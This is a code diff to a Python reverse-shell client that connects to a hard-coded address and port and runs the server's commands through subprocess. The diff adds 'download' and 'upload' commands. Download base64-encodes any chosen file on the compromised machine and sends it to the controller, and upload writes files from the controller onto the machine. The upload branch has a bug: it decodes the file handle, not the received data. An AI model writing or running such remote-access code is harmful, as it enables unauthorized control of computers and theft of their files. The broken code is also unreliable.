@@ -4,6 +4,7 @@
 import socket
 import subprocess
 import json
+import base64
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("192.168.1.96", 56789))
@@ -35,6 +36,15 @@ def shell():
 				os.chdir(server_cmd[3:])
 			except:
 				continue
+		
+		elif server_cmd[:8] == "download":
+			with open(server_cmd[9:], "rb") as docs:
+				json_send(base64.b64encode(docs.read()))
+
+		elif server_cmd[:6] == "upload":
+			with open(server_cmd[7:], "wb") as docs:
+				docs_data = json_recv()
+				docs.write(base64.b64decode(docs))
 		else:
 			# if everything goes a expected, this else condition will run
 			ps = subprocess.Popen(
